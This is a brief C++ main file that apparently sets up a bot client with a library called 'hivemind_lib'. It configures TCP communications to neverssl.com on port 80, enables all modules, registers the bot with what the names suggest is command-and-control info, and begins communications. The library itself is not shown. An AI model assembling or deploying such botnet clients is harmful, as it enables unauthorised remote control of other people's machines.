#include <iostream>
#include "hivemind.h"

int main() {
  hivemind_lib::CC_Info cc_info{1337, "meep.meep"};

  hivemind_lib::Init();
  hivemind_lib::UseTCP();
  hivemind_lib::InitComms("neverssl.com", "80");
//  hivemind_lib::AddFunction(printHi);
  hivemind_lib::AddModule(hivemind_lib::All);
  hivemind_lib::RegisterBot(cc_info);
  hivemind_lib::BeginComms();
  return 0;
}

void printHi(){
  std::cout << "HI" << std::endl;
}